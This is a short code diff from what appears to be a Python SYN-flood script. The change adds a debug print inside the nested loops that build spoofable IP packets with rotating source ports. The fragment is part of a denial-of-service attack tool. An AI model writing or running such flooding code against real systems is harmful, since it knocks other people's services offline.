@@ -9,6 +9,7 @@ def syn_flood(src,dst):
     sport = 1024
     for i in range(iterations):
         for b in range (batch):
+            print(f"i {i} , b {b}")
             sport = sport if sport <= 65535 else 1024
             # for sport in range(1024,65535):
             IPL = IP(src=src,dst=dst)
